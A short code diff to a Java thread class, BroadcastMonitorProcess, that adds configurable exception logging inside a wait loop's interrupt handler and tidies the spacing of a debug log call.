@@ -42,8 +42,12 @@ public class BroadcastMonitorProcess extends Thread {
 			try {
 				wait(period);
 			} catch (final InterruptedException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
-					Check.log(e) ;//$NON-NLS-1$
+					Check.log(e);//$NON-NLS-1$
 				}
 			}
 		} while (true);
